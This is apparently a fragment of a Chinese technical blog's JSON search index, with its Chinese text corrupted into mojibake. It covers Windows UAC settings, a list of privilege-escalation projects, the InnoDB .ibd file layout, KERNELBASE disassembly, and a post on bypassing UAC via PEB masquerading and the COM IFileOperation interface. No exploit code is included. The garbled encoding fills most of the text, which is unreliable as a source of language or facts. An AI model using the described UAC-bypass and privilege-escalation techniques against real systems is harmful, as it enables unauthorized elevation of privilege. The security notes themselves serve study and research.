â€œå…è®¸â€ï¼Œæ“ä½œå°†ä»¥æœ€é«˜å¯ç”¨æƒé™ç»§ç»­è¿›è¡Œã€‚æ­¤æ“ä½œå°†åœ¨å®‰å…¨æ¡Œé¢ä¸Šè¿›è¡Œã€‚ This option is the default. It is used to prompt the administrator in Admin Approval Mode to select either â€œPermitâ€ or â€œDenyâ€ for an operation that requires elevation of privilege for any non-Windows binaries. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. This operation will happen on the secure desktop.&lt;8&gt; å…¶ä¸­ï¼Œ0x0 æ‰€ä»£è¡¨çš„é™åˆ¶æœ€å°ï¼Œ0x5 æ˜¯é»˜è®¤çº§åˆ«ã€‚","tags":[{"name":"æƒé™ä¸ä¼šè¯","slug":"æƒé™ä¸ä¼šè¯","permalink":"https://hodlyounger.github.io/tags/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"},{"name":"windows/UAC","slug":"windows-UAC","permalink":"https://hodlyounger.github.io/tags/windows-UAC/"},{"name":"windows/appinfo","slug":"windows-appinfo","permalink":"https://hodlyounger.github.io/tags/windows-appinfo/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æƒé™ä¸ä¼šè¯","slug":"A-OS/Windows/æƒé™ä¸ä¼šè¯","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"}]},{"title":"ã€ææƒã€‘ææƒæ¼æ´åŠæ€è·¯æ•´ç†","date":"2023-11-23T16:00:00.000Z","path":"wiki/å®‰å…¨/ææƒ/ã€ææƒã€‘ææƒæ¼æ´åŠæ€è·¯æ•´ç†/","text":"æ¦‚è¿°ï¼šwindows ææƒçš„å„ç§é€”å¾„æ•´ç† ææƒæ–¹æ¡ˆæ•´ç† [ ] crisprss/PetitPotam: æ›¿ä»£PrintBugç”¨äºæœ¬åœ°ææƒçš„æ–°æ–¹å¼ï¼Œä¸»è¦åˆ©ç”¨MS-EFSRåè®®ä¸­çš„æ¥å£å‡½æ•° å€Ÿé‰´äº†Potitpotamä¸­å¯¹äºEFSRåè®®çš„åˆ©ç”¨,å®ç°äº†æœ¬åœ°ææƒçš„ä¸€ç³»åˆ—æ–¹å¼ Drawing on the use of the EFSR protocol in Potitpotam, a series of local rights escalation methods have been realized [ ] crisprss/magicAzureAttestService: é’ˆå¯¹äºAzureAttestServiceæœåŠ¡çš„æœ¬åœ°ææƒEopï¼Œå¾®è½¯è¡¨ç¤ºå·²ç»è¿›è¡Œä¿®å¤","tags":[{"name":"ææƒ","slug":"ææƒ","permalink":"https://hodlyounger.github.io/tags/%E6%8F%90%E6%9D%83/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"å®‰å…¨","slug":"wiki/å®‰å…¨","permalink":"https://hodlyounger.github.io/categories/wiki/%E5%AE%89%E5%85%A8/"},{"name":"ææƒ","slug":"wiki/å®‰å…¨/ææƒ","permalink":"https://hodlyounger.github.io/categories/wiki/%E5%AE%89%E5%85%A8/%E6%8F%90%E6%9D%83/"}]},{"title":"ã€å¼±å¯†ç ã€‘MySQL8-Innodb","date":"2023-11-21T16:00:00.000Z","path":"wiki/MySQL8/ã€å¼±å¯†ç ã€‘MySQL8-ibd/","text":"æ¦‚è¿°ï¼šMySQL8 ibdæ–‡ä»¶è¯¦è§£ã€‚MySQL8 çš„InnoDBä»¥åŠç›¸å…³æ–‡ä»¶ .ibd æ•°æ®æ–‡ä»¶çš„ä¸€ç³»åˆ—è¯´æ˜æ–‡ç« éƒ½å¯åœ¨ jeremy cole çš„ä¸ªäººç½‘ç«™ä¸Šçœ‹åˆ°ï¼Œæœ¬æ–‡ä»…å¯¹å…¶ InnoDB æ–¹é¢çš„æ–‡ç« ç®€å•ç¿»è¯‘å’Œè¯´æ˜ã€‚ åŸæ–‡é“¾æ¥ï¼šInnoDB â€“ Jeremy Cole ç›¸å…³æ–‡ç« æ¨è InnoDB â€“ Jeremy Cole IBDæ–‡ä»¶ IBD æ–‡ä»¶å¸ƒå±€ The basics of InnoDB space file layout â€“ Jeremy Cole IBD ä¸»è¦ä»¥ spaces (ç©ºé—´ä¹Ÿç§°ä½œ tablespace) ä½œä¸º MySQL å­˜å‚¨çš„ä¸Šä¸‹æ–‡ï¼Œåœ¨ InnoDB ä¸­ï¼Œå¯¹äºæ¯ä¸€ä¸ª MySQLè¡¨ï¼Œéƒ½å¢åŠ äº†è¡¨ç©ºé—´æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ .ibd æ–‡ä»¶ï¼Œä¹Ÿå³â€œfile per tableâ€ï¼Œæ¯”å¦‚ä½ åˆ›å»ºäº†ä¸€ä¸ªè¡¨ test_userï¼Œå¯¹åº”çš„å°±ä¼šåˆ›å»ºä¸€ä¸ª test_user.ibd æ–‡ä»¶ï¼Œæœ¬ç¯‡æ–‡ç« ä»¥ç¿»è¯‘å’Œè®°å½•ä¸ºä¸»æè¿° .ibd æ–‡ä»¶çš„æ–‡ä»¶ç»“æ„ã€‚ IBD æ–‡ä»¶ç»“æ„ IBDæ–‡ä»¶çš„çš„ä¸»ä½“ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼Œåˆ†ä¸º3éƒ¨åˆ†ï¼š æ¯ä¸€ä¸ª ibd æ–‡ä»¶éƒ½æœ‰ä¸€ä¸ª38å­—èŠ‚çš„å¤´å’Œ8å­—èŠ‚çš„å°¾ã€‚å¤´éƒ¨åŒ…å«äº†ä¸€ä¸ªé¡µé¢çš„åŸºç¡€ä¿¡æ¯ï¼Œå†³å®šäº†é¡µé¢å…¶ä½™éƒ¨åˆ†çš„ç»“æ„ï¼Œè¿™ä¸€ç‚¹å’ŒPEæ–‡ä»¶ç»“æ„åŸºæœ¬ä¸Šä¸€è‡´ï¼Œæ–‡ä»¶å°¾ä¸ºæ–‡ä»¶æ£€éªŒå’Œã€‚ æ–‡ä»¶å¤´å’Œæ–‡ä»¶å°¾åŒ…å«äº†ä¸€ä¸‹ç»“æ„ï¼ˆä¹±åºï¼‰ï¼š Page Type: é¡µé¢ç±»å‹ï¼Œè§£æé¡µå†…å®¹çš„å…³é”®ï¼Œå¯è¢«åˆ†é…çš„ç±»å‹åŒ…æ‹¬ä½†ä¸é™äº æ–‡ä»¶ç©ºé—´ç®¡ç†ã€æ•°æ®å­—å…¸ã€å›æ»šæ—¥å¿—ç­‰ Space ID: è¡¨ç©ºé—´ID Page Number: ä¸€æ—¦é¡µé¢è¢«åˆå§‹åŒ–ï¼ŒPage Number å°±ä¼šè¢«å­˜å‚¨åœ¨è¡¨å¤´ï¼Œå¯ç”¨äºæ£€æŸ¥å½“å‰é¡µé¢ä¸æ–‡ä»¶ä¸­çš„åç§»é‡æ˜¯å¦åŒ¹é…ã€‚è¯¥å­—æ®µå­˜åœ¨æ—¶è¡¨æ˜å½“å‰é¡µå·²ç»è¢«åˆå§‹åŒ–äº†ã€‚ Checksum: ä¸€ä¸ª32ä½çš„æ ¡éªŒå’Œ Next Page: æŒ‡å‘ä¸‹ä¸€ä¸ª Page çš„ 32ä½æŒ‡é’ˆã€‚ LSN for last page modificationï¼šå­˜å‚¨åœ¨å¤´éƒ¨çš„é¡µé¢æœ€åä¿®æ”¹çš„64å°¾æ—¥å¿—åºåˆ—å·ï¼ˆLSNï¼‰,ä½32ä½å­˜å‚¨åœ¨å°¾éƒ¨ä¸­ï¼ˆLow 32 bits of LSNï¼‰ã€‚ Flush LSNï¼šä¸€ä¸ª64ä½çš„LSNå­—æ®µï¼Œå­˜å‚¨æ•´ä¸ªç³»ç»Ÿä¸­æ‰€æœ‰é¡µé¢å½“ä¸­æœ€é«˜çš„LSNã€‚ é¡µ Pages æ˜¯è¡¨æ–‡ä»¶çš„åŸºæœ¬å•ä½ï¼Œæ¯ä¸€ä¸ªpagesçš„å¤§å°ä¸º 16kibï¼ˆä¹Ÿå°±æ˜¯ 16âˆ—102416 * 102416âˆ—1024 bitsï¼‰ã€‚è‡³äºä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªå¤§å°ï¼ŒJeremy åœ¨ä»–çš„æ–‡ç« ä¸­è¡¨ç¤ºå¯èƒ½æœ‰ä»¥ä¸‹ä¸¤ä¸ªåŸå› ï¼š ç¼–è¯‘æ—¶å®šä¹‰ UNIV_PAGE_SIZE è¢«æ›´æ”¹ ä½¿ç”¨äº† InnoDB å¯¹æ•°æ®è¿›è¡Œäº†å‹ç¼© å¯¹äºæ¯ä¸€ä¸ª Pageï¼Œéƒ½ä¸ºå…¶åˆ†é…äº†ä¸€ä¸ª 32bit çš„æ•´å‹æ•°å­—ï¼Œç§°ä½œâ€å˜å¼‚é‡â€ï¼Œå®é™…ä¸Šæ˜¯æ¯ä¸ªé¡µé¢ä¸ç©ºé—´å¼€å¤´çš„åç§»é‡ï¼ˆå¯¹äºå¤šæ–‡ä»¶çš„è¡¨ç©ºé—´ï¼Œä¸ä¸€å®šæ˜¯æ–‡ä»¶ï¼‰ã€‚åŸºäºæ­¤å¯çŸ¥ï¼Œpage0 ä½äºæ–‡ä»¶åç§»0çš„ä½ç½®ï¼Œpage10ä½äºæ–‡ä»¶åç§»16384çš„ä½ç½®ï¼Œä»¥æ­¤ç±»æ¨ã€‚ï¼ˆå¼•ç”³ä¸€ä¸‹ InnoDB çš„æ•°æ®é™é¢ï¼Œæœ€å¤§å…è®¸ 64TiB çš„å®¹é‡ï¼Œä¹Ÿå°±æ˜¯ 232âˆ—1024Kib=64TiB2^{32} * 1024 Kib = 64 TiB232âˆ—1024Kib=64TiBï¼‰ã€‚ æ¯ä¸ªè¡¨ç©ºé—´çš„ç¬¬ä¸€é¡µéƒ½æ˜¯æ–‡ä»¶å¤´çš„pageã€‚ä¸€ä¸ªæ•°æ®æ–‡ä»¶ç”±å¾ˆå¤šä¸ªé¡µç»„æˆï¼Œæ ‡å‡†çš„æ•°æ®é¡µï¼ˆINDEX pageï¼‰ç»„æˆç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š å…³äºé¡µçš„ç»“æ„å„éƒ¨åˆ†æè¿°å¦‚ä¸‹æ‰€ç¤ºï¼š FIL Header: æ–‡ä»¶å¤´ï¼Œæ‰€æœ‰é¡µé¢ç±»å‹é€šç”¨éƒ¨åˆ†ï¼Œç´¢å¼•é¡µæœ‰åˆ«äºå…¶ä»–é¡µçš„åœ°æ–¹æ˜¯å…¶ç»“æ„ä¸­çš„ privious page å’Œ next page æŒ‡å‘äº†åŒä¸€çº§çš„ç´¢å¼•ã€‚ INDEX Header: ä¿å­˜äº†å¾ˆå¤šå’Œç´¢å¼•é¡µä»¥åŠè®°å½•ç®¡ç†ç›¸å…³çš„å­—æ®µï¼Œåæ–‡è¯¦è¿°ã€‚ FSEG Header: FSEGå¤´åŒ…å«æŒ‡å‘æ¬¡ç´¢å¼•æ‰€ä½¿ç”¨çš„æ–‡ä»¶æ®µçš„æŒ‡é’ˆã€‚æœªè¢«ä½¿ç”¨çš„ç´¢å¼•é¡µçš„ FSEG æ˜¯è¢«0å¡«å……çš„ã€‚ System Records: åœ¨æ¯ä¸ªé¡µä¸­ï¼ŒInnoDB éƒ½æœ‰ä¸¤ä¸ªè¡Œè®°å½•ï¼Œä¸€ä¸ªæ˜¯ infinumï¼Œä¸€ä¸ªæ˜¯ supremumã€‚è¿™ä¸¤ä¸ªè®°å½•åœ¨é¡µé¢ä¸­çš„ä½ç½®æ˜¯å›ºå®šçš„ï¼Œå¯ä»¥æ ¹æ®é¡µé¢çš„è‡ªå·±åç§»é‡ç›´æ¥æ‰¾åˆ°è¿™ä¸¤ä¸ªå­—æ®µã€‚ User records: çœŸæ­£å­˜å‚¨ç”¨æˆ·æ•°æ®çš„åŒºåŸŸã€‚æ¯æ¡è®°å½•éƒ½æœ‰ä¸€ä¸ªä¸å®šé•¿çš„è¡¨å¤´å’Œå®é™…çš„æ•°æ®ã€‚è¡¨å¤´ä¸­åŒ…å«äº†ä¸‹ä¸€æ¡è®°å½•çš„æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæŒ‰å‡åºè®°å½•äº†ä¸‹ä¸€æ¡è®°å½•çš„åç§»é‡ï¼Œæ•´ä½“æ„æˆä¸€ä¸ªå•é“¾è¡¨ã€‚ Free Space: æœªä½¿ç”¨ç©ºé—´ Page Directory: é¡µç›®å½•ä» FIL Header åˆ° FIL Trailer è®°å½•äº†æ¯ä¸€ä¸ªé¡µçš„ä¸­ä¸€äº›è®°å½•çš„æŒ‡é’ˆï¼ˆæ¯ä¸ªé¡µé¢çš„ç¬¬4åˆ°ç¬¬8æ¡è®°å½•ï¼‰ã€‚ INDEX Header åœ¨æ¯ä¸€ä¸ªç´¢å¼•é¡µä¸­ï¼ŒINDEX Header éƒ½æœ‰ä¸€ä¸ªå›ºå®šçš„é•¿åº¦å’Œå¦‚ä¸‹æ‰€ç¤ºçš„ç»“æ„ï¼š INDEX Header ä¸­å­—æ®µï¼š Number of Directory Slots: å½“å‰é¡µé¢ç›®å½•åœ¨æ§½ä¸­çš„å¤§å°ï¼Œæ¯ä¸€ä¸ªæ§½æœ‰ 16-bit byte çš„å¤§å°ã€‚ Heap Top Position: å½“å‰ä½¿ç”¨ç©ºé—´ç»“æŸä½ç½®çš„åç§»é‡ã€‚å †é¡¶å’Œé¡µé¢ç›®å½•ç»“æŸä¹‹é—´çš„ç©ºé—´éƒ½æ˜¯ç©ºé—²ç©ºé—´ã€‚ Number of Heap Records/Format Flag: Format Flag: å½“å‰é¡µçš„è®°å½•æ ¼å¼ï¼Œå­˜å‚¨åœ¨ Number of Heap Records çš„é«˜ä½ï¼ˆ0x8000ï¼‰ä¸­ã€‚æ€»å…±æœ‰ä¸¤ä¸ªç±»å‹ã€‚COMPACT å’Œ REDUNDANT Number of Heap Records: å½“å‰é¡µé¢çš„è®°å½•æ€»é‡ï¼ŒåŒ…æ‹¬ç³»ç»Ÿè®°å½• infimum å’Œ supremum ä»¥åŠåˆ é™¤çš„è®°å½•ã€‚ First Garbage Record Offset: æŒ‡å‘åˆ é™¤è®°å½•é“¾è¡¨ä¸­ç¬¬ä¸€ä¸ªçš„å…¥å£ã€‚ Garbage Space: åˆ é™¤è®°å½•ä¸­å·²è¢«åˆ é™¤çš„è®°å½•çš„å­—èŠ‚æ€»æ•°ã€‚ Last Insert Position: æœ€åæ’å…¥é¡µé¢è®°å½•çš„å­—èŠ‚åç§»é‡ã€‚ Page Direction: é¡µé¢ç”Ÿé•¿æ–¹å‘ï¼ŒLEFTã€RIGHTã€NO_DIRECTION ä¸‰ä¸ªå€¼ã€‚å†³å®šäº†é¡µé¢æ˜¯é¡ºåºæ’å…¥è¿˜æ˜¯éšæœºæ’å…¥ã€‚æ¯æ¬¡æ’å…¥æ—¶ï¼Œéƒ½ä¼šè¯»å–æœ€åæ’å…¥ä½ç½®çš„è®°å½•ï¼Œå¹¶å°†å…¶é”®ä¸å½“å‰æ’å…¥è®°å½•çš„é”®è¿›è¡Œæ¯”è¾ƒï¼Œç„¶åç¡®å®šæ’å…¥çš„æ–¹å‘ã€‚ Number of Inserts in Page Direction: å½“ Page Direction è¢«è®¾ç½®åï¼Œä»»ä½•è¢«æ’å…¥çš„æ•°æ®éƒ½ä¸èƒ½é‡ç½®æ–¹å‘ï¼Œä½†æ˜¯ä¼šé€’å¢å½“å‰å€¼ã€‚ Number of Records: å½“å‰é¡µé¢ä¸­æœªè¢«åˆ é™¤çš„ç”¨æˆ·è®°å½•æ•°é‡ã€‚ MaxiMum Transaction ID: å½“å‰é¡µé¢ä¸­æ‰€æœ‰è®°å½•ä¸­æœ€å¤§çš„äº‹åŠ¡IDã€‚ Page Level: å½“å‰é¡µé¢åœ¨ç´¢å¼•ä¸­çš„çº§åˆ«ã€‚å¶å­èŠ‚ç‚¹çš„çº§åˆ«ä¸º 0, B+æ ‘çš„çº§åˆ«ä¸€æ¬¡é€’å¢ã€‚ Index ID: å½“å‰é¡µé¢æ‰€å±ID å…³äºè®°å½•æŒ‡é’ˆï¼ˆRecord pointerï¼‰ï¼š è®°å½•æŒ‡é’ˆè¢«ç”¨åœ¨æœåŠ¡çš„ä¸åŒåœ°æ–¹ã€‚INDEX Header ä¸­çš„æœ€åä¸€æ¬¡æ’å…¥ä½ç½®å­—æ®µã€æ‰€æœ‰é¡µç›®å½•çš„å€¼ã€ä»¥åŠç³»ç»Ÿä¸­ä¸‹ä¸€æ¡è®°å½•ã€ç”¨æˆ·è®°å½•ã€‚æ‰€æœ‰çš„è®°å½•éƒ½åŒ…å«äº†ä¸€ä¸ªå¤´ï¼ˆå¯å˜é•¿ï¼‰ï¼Œç„¶ååè¾¹è·Ÿç€ä¸€ä¸ªå®é™…çš„æ•°æ®ï¼ˆå¯å˜é•¿ï¼‰ã€‚Record pointers æŒ‡å‘äº†è®°å½•æ•°æ®ä¸­çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œå®é™…ä¸Šæ˜¯ä»‹äºå¤´å’Œè®°å½•æ•°æ®ä¹‹é—´ã€‚è¿™æ ·å°±å¯ä»¥é€šè¿‡ä»è¯¥ä½ç½®å‘åè¯»å–å¤´ï¼Œå¹¶ä»è¯¥ä½ç½®è¯»å–è®°å½•æ•°æ®ã€‚ ç”±äºç³»ç»Ÿè®°å½•å’Œç”¨æˆ·è®°å½•çš„NextæŒ‡é’ˆæ€»æ˜¯æŒ‡å‘ Header ä¸­çš„ç¬¬ä¸€ä¸ªå­—æ®µï¼Œå› æ­¤ä»è¿™ä¸ªæŒ‡é’ˆå‘åè¯»å–ï¼Œå°±å¯ä»¥éå¸¸é«˜æ•ˆçš„è¯»å–ä¸€æ•´ä¸ªé¡µé¢è€Œä¸ç”¨è§£æå¯å˜é•¿çš„æ•°æ®è®°å½•ã€‚ System records: infimum and supermum æ¯ä¸€ä¸ªç´¢å¼•é¡µéƒ½åŒ…å«ä¸¤ä¸ªç³»ç»Ÿè®°å½•ï¼Œinfimum å’Œ supermum, å­˜å‚¨åœ¨å›ºå®šçš„ä½ç½®ï¼ˆä¾æ¬¡ åç§»ä½ç½® 99 å’Œ 112ï¼‰ã€‚ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š ä¸¤ä¸ªç³»ç»Ÿè®°å½•å‰éƒ½æœ‰ä¸€ä¸ªå…¸å‹çš„è®°å½•å¤´ï¼Œå¹¶ä¸” infimum å’Œ supremum æ˜¯è¿™ä¸¤ä¸ªç³»ç»Ÿè®°å½•çš„å”¯ä¸€å€¼ã€‚åªéœ€è¦å…³æ³¨ç³»ç»Ÿè®°å½•å‰çš„è®°å½•å¤´å³å¯ã€‚ The infimum record infimum record è¡¨ç¤ºæ¯”å½“å‰é¡µé¢ä»»ä½•é”®å€¼éƒ½ä½çš„å€¼ã€‚å®ƒçš„ Next record æŒ‡é’ˆæŒ‡å‘äº†é¡µé¢ä¸­é”®å€¼æœ€ä½çš„ç”¨æˆ·è®°å½•ã€‚infimum æ˜¯æŒ‰åºæ‰«æç”¨æˆ·æ•°æ®çš„ä¸€ä¸ªå›ºå®šå…¥å£ç‚¹ã€‚ The supremum record supremum record è¡¨ç¤ºæ¯”å½“å‰é¡µé¢ä»»ä½•é”®å€¼éƒ½é«˜çš„å€¼ã€‚å®ƒçš„ Next record å§‹ç»ˆä¸º0ï¼ˆç”±äºé¡µå¤´çš„é—®é¢˜ï¼Œè®°å½•äº†ä¸€æ¡æ— æ•ˆåœ°å®é™…æ•°æ®ï¼‰ï¼Œé¡µé¢ä¸­é”®å€¼æœ€é«˜çš„ç”¨æˆ·è®°å½•çš„ä¸‹ä¸€æ¡è®°å½•æ€»æ˜¯æŒ‡å‘supremumã€‚ User records åŸä½œï¼šThe physical structure of InnoDB index pages â€“ Jeremy Cole ç”¨æˆ·è¡¨æ¯”è¾ƒå¤æ‚ï¼ŒåŸä½œè€…åœ¨ä¹‹åçš„æ–‡ç« ä¸­å¯èƒ½ä¼šè¯¦ç»†æè¿°ã€‚ ç”¨æˆ·è®°å½•ä¼šæŒ‰ç…§æ’å…¥çš„é¡ºåºæ·»åŠ åˆ°é¡µé¢ï¼ˆå¹¶ä¸”å¯ä»¥ä»å…ˆå‰åˆ é™¤çš„è®°å½•ä¸­è·å–ç°æœ‰çš„å¯ç”¨ç©ºé—´ï¼‰ï¼Œå¹¶ä¸”ä½¿ç”¨æ¯ä¸ªè®°å½•ä¸­çš„ next record æŒ‰å‡åºæ„æˆä¸€æ¡å•é“¾è¡¨ã€‚ä¸€ä¸ªå•é“¾è¡¨ä»æœ€å°å€¼å¼€å§‹ã€‚å¹¶åœ¨æœ€å¤§å€¼å¤„ç»“æŸã€‚ä½¿ç”¨è¿™ä¸ªé“¾è¡¨å¯ä»¥æ‰«æé¡µé¢ä¸­çš„æ‰€æœ‰ç”¨æˆ·è®°å½•ã€‚ è¿™å°±æ„å‘³ç€ä½¿ç”¨è¿™ä¸ªå•é“¾è¡¨æŒ‰ç…§å‡åºä»ä¸€é¡µæ‰«æåˆ°å¦ä¸€ä¸ªå¾ˆç®€å•ï¼Œä»è€Œéå†æ•´ä¸ªç´¢å¼•ã€‚å¤§è‡´å¦‚ä¸‹ï¼š ä»ç´¢å¼•é¡µçš„ç¬¬ä¸€é¡µï¼ˆlowest keyï¼‰å¼€å§‹(è¿™ä¸ªé¡µé¢æ˜¯é€šè¿‡éå†B+æ ‘æ‰¾åˆ°çš„)ã€‚ è¯»å– infimum, ç„¶åè·Ÿè¸ªå®ƒçš„ next record æŒ‡é’ˆã€‚ å¦‚æœè®°å½•æ˜¯ supremum, åˆ™ç»§ç»­æ‰§è¡Œæ­¥éª¤5ï¼Œå¦‚æœä¸æ˜¯ï¼Œç»§ç»­è¯»å–å¹¶å¤„ç†æ–‡ä»¶ è·Ÿè¸ª next record æŒ‡é’ˆï¼Œç„¶åç»§ç»­æ­¥éª¤3 å¦‚æœ next record æŒ‡é’ˆæŒ‡å‘ NULLï¼Œåˆ™é€€å‡ºï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™ç»§ç»­è·Ÿè¸ª next pageï¼Œç„¶åæ‰§è¡Œæ­¥éª¤2ã€‚ The page directory é¡µç›®å½•å¼€å§‹äºæ–‡ä»¶å°¾ï¼Œç„¶åâ€œå‘ä¸‹â€æ‰©å±•åˆ°ç”¨æˆ·è®°å½•ã€‚é¡µç›®å½•åŒ…å«äº†ä¸€ä¸ªæŒ‡å‘ 4-8æ¡è®°å½•çš„æŒ‡é’ˆã€‚æ­¤å¤–è¿˜åŒ…å«äº†ä¸€ä¸ª infimum å’Œ supremum çš„å…¥å£åœ°å€ã€‚ é¡µé¢ç›®å½•åªæ˜¯ä¸€ä¸ªåŠ¨æ€å¤§å°çš„ 16 ä½åç§»æŒ‡é’ˆæ•°ç»„ï¼ŒæŒ‡å‘é¡µé¢å†…çš„è®°å½•ã€‚ä½œè€…æš‚æ—¶è¿˜æ²¡æœ‰å±•å¼€ç»†è®²ã€‚ Free Space å†…å­˜ä½äºç”¨æˆ·è®°å½•ï¼ˆå‘ä¸Šå¢é•¿ï¼‰å’Œé¡µç›®å½•ï¼ˆå‘ä¸‹å¢é•¿ï¼‰çš„ç©ºé—´å°±æ˜¯é—²ç½®ç©ºé—´ã€‚ä¸€æ—¦ç”¨æˆ·ç©ºé—´å’Œé¡µç›®å½•ç›¸é‡ï¼Œä¹Ÿå°±æ˜¯é—²ç½®ç©ºé—´ä¹Ÿè¢«å ç”¨ï¼Œå°±ä»£è¡¨å½“å‰é¡µå·²æ»¡ã€‚","tags":[{"name":"æ•°æ®åº“/MySQL","slug":"æ•°æ®åº“-MySQL","permalink":"https://hodlyounger.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93-MySQL/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"MySQL8","slug":"wiki/MySQL8","permalink":"https://hodlyounger.github.io/categories/wiki/MySQL8/"}]},{"title":"ã€æ±‡ç¼–ã€‘ç³»ç»Ÿæ±‡ç¼–ä»£ç æ•´ç†","date":"2023-11-20T16:00:00.000Z","path":"B_Code/æ±‡ç¼–/ã€æ±‡ç¼–ã€‘è·å–è¿›ç¨‹ç³»ç»Ÿä¿¡æ¯/","text":"æ¦‚è¿°ï¼šæ±‡ç¼–è·å–è¿›ç¨‹å’Œç³»ç»Ÿçš„ä¿¡æ¯ è·å–è¿›ç¨‹id æ¥æºï¼šKERNELBASE!GetCurrentProcessId 1234762a2b20 64a118000000 mov eax, dword ptr fs:[00000018h]762a2b26 8b4020 mov eax, dword ptr [eax+20h]762a2b29 c3 ret 762a2b2a cc int 3 è·å–TickCount æ¥æºï¼šKERNELBASE!GetTickCount: 123456789101112131415762a1ed0 8bff mov edi, edi762a1ed2 55 push ebp762a1ed3 8bec mov ebp, esp762a1ed5 51 push ecx762a1ed6 8b0d0400fe7f mov ecx, dword ptr ds:[7FFE0004h]762a1edc 894dfc mov dword ptr [ebp-4], ecx762a1edf 81f900000001 cmp ecx, 1000000h762a1ee5 0f82bae10400 jb KERNELBASE!GetTickCount+0x4e1d5 (762f00a5)762a1eeb b82003fe7f mov eax, 7FFE0320h762a1ef0 8b00 mov eax, dword ptr [eax]762a1ef2 f7e1 mul eax, ecx762a1ef4 0facd018 shrd eax, edx, 18h762a1ef8 8be5 mov esp, ebp762a1efa 5d pop ebp762a1efb c3 ret è·å–TickCount64 æ¥æºï¼šKERNELBASE!GetTickCount64 123456789101112131415161718192021222324252627282930313233343536762a2e30 8bff mov edi, edi762a2e32 55 push ebp762a2e33 8bec mov ebp, esp762a2e35 51 push ecx762a2e36 53 push ebx762a2e37 56 push esi762a2e38 57 push edi762a2e39 8b3d0400fe7f mov edi, dword ptr ds:[7FFE0004h]762a2e3f ba2403fe7f mov edx, 7FFE0324h762a2e44 897dfc mov dword ptr [ebp-4], edi762a2e47 be2003fe7f mov esi, 7FFE0320h762a2e4c bf2803fe7f mov edi, 7FFE0328h762a2e51 8b02 mov eax, dword ptr [edx]762a2e53 8b1e mov ebx, dword ptr [esi]762a2e55 8b0f mov ecx, dword ptr [edi]762a2e57 3bc1 cmp eax, ecx762a2e59 7525 jne KERNELBASE!_GetTickCount64@0+0x50 (762a2e80)762a2e5b f765fc mul eax, dword ptr [ebp-4]762a2e5e 5f pop edi762a2e5f 8bc8 mov ecx, eax762a2e61 8bf2 mov esi, edx762a2e63 8bc3 mov eax, ebx762a2e65 f765fc mul eax, dword ptr [ebp-4]762a2e68 0fa4ce08 shld esi, ecx, 8762a2e6c 0facd018 shrd eax, edx, 18h762a2e70 c1e108 shl ecx, 8762a2e73 c1ea18 shr edx, 18h762a2e76 03c1 add eax, ecx762a2e78 13d6 adc edx, esi762a2e7a 5e pop esi762a2e7b 5b pop ebx762a2e7c 8be5 mov esp, ebp762a2e7e 5d pop ebp762a2e7f c3 ret 762a2e80 f390 pause 762a2e82 ebcd jmp KERNELBASE!_GetTickCount64@0+0x21 (762a2e51)","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"æ±‡ç¼–","slug":"B-Code/æ±‡ç¼–","permalink":"https://hodlyounger.github.io/categories/B-Code/%E6%B1%87%E7%BC%96/"}]},{"title":"ã€COMã€‘é€šè¿‡COMç»„ä»¶IFileOperationè¶Šæƒå¤åˆ¶æ–‡ä»¶","date":"2023-11-20T16:00:00.000Z","path":"A_OS/Windows/COM/ã€COMã€‘é€šè¿‡COMç»„ä»¶IFileOperationè¶Šæƒå¤åˆ¶æ–‡ä»¶/","text":"æ¦‚è¿°ï¼šæœ¬æ–‡æ˜¯åŸºäºä¼ªè£…PEBè¿›è¡Œè¶Šæƒå¤åˆ¶æ–‡ä»¶ç›¸å…³å­¦ä¹ ç ”ç©¶è¿›è¡Œçš„æ‹“å±•æ–‡ç« ï¼Œä¸»è¦è®°å½•é€šè¿‡COMç»„ä»¶è¶Šæƒå¤åˆ¶æ–‡ä»¶ã€‚ [toc] æœ¬ç¯‡åšå®¢å‚è€ƒçš„æ–‡ç« è¾ƒå¤šï¼Œä¸»è¦æè¿°å’Œè®°å½•ä¸€ä¸‹ä¼ªè£…PEBè¿›è¡Œè¶Šæƒå¤åˆ¶çš„æ“ä½œã€‚ ä¼ªè£…PEBè¿›è¡Œè¶Šæƒå¤åˆ¶ ä¼ªè£…PEB ä¸»è¦æ“ä½œå°±æ˜¯ä¿®æ”¹å½“å‰è¿›ç¨‹çš„ ImagePathName ã€ CommandLineã€ FullDllName ã€BaseDllName è¿™å‡ ä¸ªå˜é‡ï¼Œé€šè¿‡ä¿®æ”¹æˆä¸ºä¸ç³»ç»Ÿå¯ä¿¡çš„è¿›ç¨‹ä¸€æ ·çš„å†…å®¹è¿›è€Œå®ç°è¶Šæƒæ“ä½œã€‚3gstudent æä¾›äº†Demoï¼Œå¯ä»¥å»Githubçœ‹ä¸‹ç›¸å…³é€»è¾‘ï¼Œè¿™é‡Œä¸åšè¿‡å¤šè§£é‡Šã€‚ _RTL_USER_PROCESS_PARAMETERS.ImagePathName _RTL_USER_PROCESS_PARAMETERS.CommandLine(å¯é€‰) _LDR_DATA_TABLE_ENTRY.FullDllName _LDR_DATA_TABLE_ENTRY.BaseDllName æºä»£ç è·¯å¾„ï¼šhttps://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/MasqueradePEB.cpp åŸç†ï¼šCOMç»„ä»¶é€šè¿‡ Process Status API (PSAPI) 